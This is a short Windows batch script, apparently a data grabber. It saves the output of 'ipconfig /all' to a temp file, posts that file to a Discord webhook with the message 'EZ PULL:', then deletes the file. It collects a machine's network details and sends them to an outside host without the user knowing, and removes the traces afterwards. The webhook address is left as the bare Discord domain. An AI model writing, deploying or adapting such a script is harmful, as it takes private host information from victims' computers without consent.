@echo off
set "WEBHOOK_URL=https://discord.com"
ipconfig /all > "%temp%\ipconfig_output.txt"
curl -F "file=@%temp%\ipconfig_output.txt" -F "payload_json={\"content\": \"EZ PULL:\"}" "%WEBHOOK_URL%"
del "%temp%\ipconfig_output.txt"
exit
